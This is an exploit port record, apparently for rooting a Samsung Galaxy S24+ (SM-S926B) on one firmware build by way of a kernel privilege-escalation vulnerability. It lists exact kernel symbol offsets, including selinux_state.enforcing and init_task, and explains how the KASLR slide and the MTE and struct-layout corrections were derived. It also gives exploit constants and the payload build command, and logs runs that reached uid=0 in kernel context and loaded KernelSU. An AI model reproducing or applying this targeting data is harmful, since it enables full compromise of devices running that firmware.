# Galaxy S24+ SM-S926B / S926BXXUEDZDR port record

This record contains the exact offline inputs and derived values for profile
`e2s-S926BXXUEDZDR`. Values were recovered from the EUX/OXM factory firmware
supplied for this port; none were selected by model name alone. Initial
hardware validation is complete for temporary shell root on the exact target.

## Firmware identity

```text
model: SM-S926B
device: e2s
region / multi-CSC: EUX / OXM
AP/PDA: S926BXXUEDZDR
CSC: S926BOXMEDZDR
display build: BP4A.251205.006.S926BXXUEDZDR
fingerprint: samsung/e2sxeea/e2s:16/BP4A.251205.006/S926BXXUEDZDR:user/release-keys
SDK: 36
ABI: arm64-v8a
page size: 4096
security patch: 2026-04-05
kernel release: 6.1.157-android14-11
kernel build: #1 SMP PREEMPT Wed Apr 29 09:40:41 UTC 2026
```

The first connected-device identity capture established the composite
`ro.build.fingerprint` above. The partition properties remain
`ro.system.build.fingerprint=samsung/e2sxxx/essi:...` and
`ro.vendor.build.fingerprint=samsung/e2sxxx/e2s:14/...`; the feed must match
the composite property exposed by the shipping EUX device, not either
partition-local fingerprint. The live model, device, display, kernel release,
kernel build string and page size all match this profile.

## Source provenance

```text
factory ZIP size: 17605894927
factory ZIP SHA-256: 7C7C0D00F64ED486665D02B5D3697DDEA694C792FD944A5D44216538A3F9106E

AP archive size: 19090053243
AP archive SHA-256: 35889108471E55E4D45C52E73B6C8C27C8C88BAD84E600BC7FF4D6B1B7FDB049
AP tar payload MD5: 2F8AA4F2111E0CE3758EC82686799C42

BL archive size: 12370033
BL archive SHA-256: 595E928C43F8F5C3857D18DB7003C74694BEB5695AA24F8011551A14B245EAE5
BL tar payload MD5: 46726AAE5F11018DC3A2D8D8D8EC970F

fota.zip size: 1257519701
fota.zip SHA-256: 1F9F59DF25C494B5287E72E24AC22B9B0BC3726074B427EE51A8904525B44622
```

The AP and BL MD5 values were read from the Samsung `.tar.md5` trailers and
recomputed over the exact tar payload lengths before any image was used.

## Extracted image hashes

```text
boot.img size: 67108864
boot.img SHA-256: 0D4C35FB8E0099D3945D7E90458E547612D8DE9656DE943D689D04826E6F6136
vendor_boot.img SHA-256: 5B60668DDB6341378F7829A9B644333E429F81CBF0F713F6E933A5B774DA02D9
sboot.bin SHA-256: EF686B6223F2A41FC4034EB4A8D683FF1CC3A18DC8B27E5DA56345AEA6BB33DC
kernel size: 38832640
kernel SHA-256: 66FB9719AA657293AE15F3013D5001E2BB8A42FA45CAE2C36F43AB9DA38B4B44
ARM64 Image text_offset: 0x0
ARM64 Image size: 0x27c0000
ARM64 Image flags: 0xa
```

The `BOOT/kernel` member from `fota.zip` is byte-for-byte identical to the
`kernel_size` bytes at boot-image offset `0x1000`. The boot header is version 4.

## Symbol and BTF recovery

`vmlinux-to-elf` 1.2.2 recovered 115630 symbols at image base
`0xffffffc008000000`. Raw BTF was uniquely validated and extracted from
`[0x188c248, 0x1e439a9)`.

Required target offsets are:

| Macro/use | Exact derivation | Offset |
| --- | --- | ---: |
| `CALL_USERMODEHELPER_EXEC_WORK_OFF` | `call_usermodehelper_exec_work` | `0x000d4468` |
| `SLIDE_TRACEFS_WORKER_CALLER_OFF` | instruction after `worker_thread -> schedule` | `0x000dbd9c` |
| `NOOP_LLSEEK_OFF` | `noop_llseek` | `0x003a1414` |
| `COPY_SPLICE_READ_OFF` | `generic_file_splice_read` | `0x003ef02c` |
| `CONFIGFS_READ_ITER_OFF` | `configfs_read_iter` | `0x00470d44` |
| `CONFIGFS_BIN_WRITE_ITER_OFF` | `configfs_bin_write_iter` | `0x00471274` |
| `ASHMEM_IOCTL_OFF` | `ashmem_ioctl` | `0x00d38cfc` |
| `ASHMEM_COMPAT_IOCTL_OFF` | `compat_ashmem_ioctl` | `0x00d39634` |
| `ASHMEM_MMAP_OFF` | `ashmem_mmap` | `0x00d3968c` |
| `ASHMEM_OPEN_OFF` | `ashmem_open` | `0x00d398b8` |
| `ASHMEM_RELEASE_OFF` | `ashmem_release` | `0x00d39940` |
| `ASHMEM_SHOW_FDINFO_OFF` | `ashmem_show_fdinfo` | `0x00d39a60` |
| `ANON_PIPE_BUF_OPS_OFF` | `anon_pipe_buf_ops` | `0x0121dd10` |
| `ASHMEM_FOPS_OFF` | `ashmem_fops` | `0x013d9ec8` |
| `SLIDE_NFULNL_LOGGER_NAME_OFF` | `"nfnetlink_log"` referenced by `nfulnl_logger.name` | `0x016dd6a0` |
| `KMALLOC_CACHES_OFF` | `kmalloc_caches` | `0x017a8098` |
| `SYSTEM_UNBOUND_WQ_OFF` | `system_unbound_wq` | `0x022eae58` |
| `SLIDE_NFULNL_LOGGER_OBJECT_OFF` | `nfulnl_logger` | `0x022f2a08` |
| `INIT_TASK_OFF` | `init_task` | `0x022ff800` |
| `SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF` | `random_table[]` `boot_id` data pointer | `0x0243ef78` |
| `ASHMEM_MISC_FOPS_OFF` | `ashmem_miscs + offsetof(miscdevice, fops)` | `0x02484bb0` |
| `ROOT_TASK_GROUP_OFF` | `root_task_group` | `0x02515cc0` |
| `SELINUX_ENFORCING_OFF` | `selinux_state.enforcing` | `0x025ea478` |
| `SLIDE_SYSCTL_BOOTID_OFF` | `sysctl_bootid` | `0x026d1b60` |

Raw pointer checks in the Image confirm that `nfulnl_logger.name` points to
`0xffffffc0096dd6a0` and the selected `random_table[]` slot points to
`0xffffffc00a6d1b60`.

Target BTF confirms the exploit-relevant 6.1 layouts: `file_operations` is
`0x110`, `page`/`slab` is `0x40`, `miscdevice.fops` is `0x10`, and all task,
configfs, workqueue and pipe offsets in `target.h` match this Image. In
particular, `rt_mutex_waiter` is the compact `0x58`-byte layout with
`pi_tree_entry=0x18`, `task=0x30`, `lock=0x38`, `wake_state=0x40`,
`prio=0x44`, `deadline=0x48` and `ww_ctx=0x50`; the target explicitly selects
`COMPACT_RT_MUTEX_WAITER`.

Target BTF reports `sizeof(struct mm_struct) == 960 (0x3c0)`, while live
`/proc/slabinfo` and hardware address deltas show that objects occupy a
`0x400`-byte SLUB stride on this configuration. The first diagnostic build had
inherited the repository default `0x500`, and a literal `0x3c0` BTF-size build
still enumerated the wrong candidate boundaries. The hardware-correct target
therefore explicitly sets:

```c
#define MM_STRUCT_SZ 0x400
#define MM_ORDER 3
```

The kernel additionally has `CONFIG_ARM64_MTE=y` and
`CONFIG_KASAN_HW_TAGS=y`, so the target sets `KERNELSNITCH_MTE_ENABLED=1`.
The first MTE-aware run found `mm_struct` at tagged address
`f3ffff8c66b2a1c0`. This proved tag enumeration but exposed a boundary between
KernelSnitch and the page-shaping code: the latter requires the canonical
direct-map form. The wrapper now preserves the tagged address only during the
futex-hash search and converts a successful result to `ffffff8c66b2a1c0`
before slab-page arithmetic.

## KASLR slide derivation

The target symbols are:

```text
__start_ftrace_events        0xffffffc00a2aa940
__event_sched_blocked_reason 0xffffffc00a2aabf0
```

Their difference is `0x2b0`, giving zero-based event index `86`; with
`__TRACE_LAST_TYPE == 20`, `SLIDE_TRACEFS_EVENT_ID` is `106`. In
`worker_thread`, the blocking `bl schedule` is at `0xffffffc0080dbd98` and the
saved return instruction is at `0xffffffc0080dbd9c`.

The initial static stack analysis selected `SLIDE_PSELECT_WORD_SHIFT=0`, but
hardware panic readback superseded that assumption. At the stale waiter, the
dump contained `fake_task`, `fake_lock`, and `wake_state+prio` in qwords 3, 4,
and 5 instead of the required compact-layout qwords 6, 7, and 8. Consequently
`rt_mutex_adjust_prio_chain` loaded `waiter->lock == NULL` and faulted in
`_raw_spin_trylock+0x1c`. Advancing the source sequence by three qwords aligns
the complete waiter:

```c
#define SLIDE_PSELECT_WORD_SHIFT 3
```

Attempt 6 confirmed that correction on hardware: the kernel read the intended
non-null `fake_lock` from `waiter->lock`. The resulting level-1 translation
fault was at `base - 0xe80 + 0x5200`, proving that the waiter layout was now
right but the skb payload base was not mapped at the assumed offset. Exact BTF
gives `sizeof(struct skb_shared_info) == 344`, while the 64 KiB
`unix_stream_sendmsg` fragment is page-aligned. The first order-3 fragment
therefore begins at source offset `0x1000`, matching the hardware fault
arithmetic and requiring:

```c
#define SKB_DATA_DELTA (-0x1000LL)
```

`p0_fingerprint.h` was generated from this exact raw Image for all 32 slide
candidates `0x000000` through `0x1f0000`. Generation verification compared all
256 emitted qwords back to their source offsets.

## Physical load proof

The `Starting kernel...` string is at sboot offset `0x3935e6`. Its call path at
`0x248f84` loads the Image text offset, places `0x80000000` in `w9`, adds both
values into the branch register, and executes `blr x19` at `0x248fcc`. Since
the raw Image has `text_offset == 0`:

```c
#define P0_PHYS_OFFSET 0x80000000ULL
#define P0_KERNEL_PHYS_LOAD 0x80000000ULL
```

## Payload build

The payload was compiled with Android NDK r29 (`29.0.14206865`):

```sh
make TARGET=e2s-S926BXXUEDZDR \
  ANDROID_NDK_HOME=/path/to/android-ndk-r29 all release
```

The fixed-size release artifact is:

```text
artifacts/e2s-S926BXXUEDZDR/cve-2026-43499-app.so
size: 104128
SHA-256: B1FE6DCC2E4D5CBFC13679F2086835C0A2AB2BE5624F122B23B0C30954670552
```

The E2S target enables its validated fast KernelSnitch profile by default.
It keeps five collisions, three confirmations and every P0 fingerprint,
restore, alias, CFI, physical read/write and root-result gate. Only repeated
statistical sampling is reduced to 2,048 appended futexes, 32 measurements and
four averaged samples for both P0 and fops searches. Up to 16 search batches
may locate candidates, while no more than eight independently rebuilt P0 or
FOPS pages can reach a physical gate. Empty searches do not consume a physical
gate, and every accepted page remains single-shot.

## KernelSU compatibility

The target IKCONFIG has `CONFIG_MODVERSIONS=y`,
`CONFIG_MODULE_FORCE_LOAD=n`, `CONFIG_TRIM_UNUSED_KSYMS=n` and
`CONFIG_DEBUG_INFO_BTF=y`. The existing Samsung android14-6.1 module reports
the exact target vermagic:

```text
6.1.157-android14-11 SMP preempt mod_unload modversions aarch64
```

The manual-relocation audit checked 209 undefined imports against this target's
recovered ELF: zero symbols are missing, 50 are intentionally resolved through
`/proc/kallsyms`, the `__versions` section is empty, and there are zero target
CRC mismatches. Target BTF also confirms the expected Samsung KDP prototypes.
The exact no-patch-text pair is:

```text
kernelsu/android14-6.1_kernelsu-e2s-S926BXXUEDZDR-kdp.ko
size: 398368
SHA-256: A6C521A2F660F595F4EA359C243E27B85142CBCDC832C84340DAC0994F8D12135

kernelsu/ksud-e2s-S926BXXUEDZDR-kdp
size: 4780056
SHA-256: DC3EB02640492A8D6F78F8515C6AE5C75DDBFA593F53CD0F3EFDFC82A29C4219
```

The module has the exact `6.1.157-android14-11` vermagic, an empty
`__versions` section, 202 undefined imports, zero imports missing from the
recovered target ELF, zero target CRC mismatches and no `stop_machine` import.
The shared Samsung patch already contains the required no-patch-text option;
applying that upstream patch to KernelSU v3.2.5 produces the same source tree
used for this E2S build.

## Validation state

All firmware integrity, Image extraction, symbol, BTF, pointer, physical-load,
P0-table, build-size and KernelSU offline gates pass. The complete diagnostic
history and retained logs are in the associated port bundle.

Attempt 71 run 1 validated the unstripped APP build on a clean boot. It reached
exact P0/FOPS gates, an accepted slide fingerprint, exact production slot-4
write, successful CFI and physical read/write, and kernel workqueue UMH with
`retval=0`. The root client returned `uid=0(root) gid=0(root) groups=0(root)
context=u:r:kernel:s0`.

Attempt 71 run 2 independently validated the exact 104128-byte fixed-size
production71 artifact on clean boot
`6bac6435-28eb-43b5-a7bd-58d017fc04fa`. Its
final summary was `done=1 root=1 kaslr=1 read_ok=1 write_ok=1 rw64=1/1
uid=2000->0`; the client again returned the same root identity and
`u:r:kernel:s0`. Temporary in-memory shell root is therefore hardware-verified
for this exact firmware.

Attempt 72 validated the fast sampling profile on clean boot
`c5ddec4d-61e3-49bd-997d-33912f9e3959`. P0 discovery completed in 27,902 ms,
fops page preparation completed in 6,825 ms, and the full exploit reached the
independent `uid=0` check in approximately 46 seconds. The same session loaded
the exact no-patch-text module, reported KernelSU version code `32525`, passed
the Manager control probe and produced an independent client shell with
`uid=0(root)` and `u:r:ksu:s0`.

The final contribution candidate was rebuilt on upstream commit `49fc33f` with
eight P0 gates, eight FOPS gates, and 16 search batches for each stage. Two NDK
r29 builds were byte-identical, and the exact-profile verifier passed 137/137
checks. The resulting fixed-size artifact has SHA-256
`b1fe6dcc2e4d5cbfc13679f2086835c0a2ab2be5624f122b23b0c30954670552`.

That exact artifact passed three independent clean-boot runs:

| Run | Boot ID | P0 result | FOPS result | Runtime slide | Exploit time |
| ---: | --- | --- | --- | ---: | ---: |
| 1 | `3c180d4f-8e0f-423f-82a2-b45b73eb7296` | `fresh=2/8`, fingerprint 8/8 | `fresh=1/8` | `0x0d0000` | ~228 s |
| 2 | `c98d26a4-b6b1-4213-ba1d-ea08949bfcd1` | `fresh=1/8`, fingerprint 8/8 | `fresh=2/8` | `0x0a0000` | ~118 s |
| 3 | `1c9ac941-59a8-4a60-a41f-771a293891d2` | `fresh=2/8`, fingerprint 8/8 | first gate after three empty batches | `0x1e0000` | ~298 s |

Every run completed the exact production pointer write/readback, CFI
read/write, physical R/W, `read64`, and UMH root stages. Each final payload
summary reported `done=1 root=1 kaslr=1 read_ok=1 write_ok=1 rw64=1/1
uid=2000->0`, and an independent client returned `uid=0(root)` in
`u:r:kernel:s0`.

All three runs used the 21,464-byte helper extracted from the built debug APK
(SHA-256 `c37cef0dd05b97b4845e1dde3927b15b9615be8fda551c23dc8b2cce0c62fc07`).
The published E2S `ksud` reported `current-kmi=android14-6.1`, was invoked
without a forced `--kmi` argument, and loaded its exact embedded module without
a reboot or compatibility bridge. The final runner verified the unchanged boot
ID, the live `kernelsu` entry in `/proc/modules`, successful module load, and
the loader transition to `u:r:ksu:s0`. The production module deliberately uses
`allow_shell=false`; a new UID-2000 ADB shell remains unprivileged until its UID
is authorized in Manager. Manager reported `Working <LKM> [Jailbreak mode]`,
version `32525-2`, and a reversible application-profile update was verified.
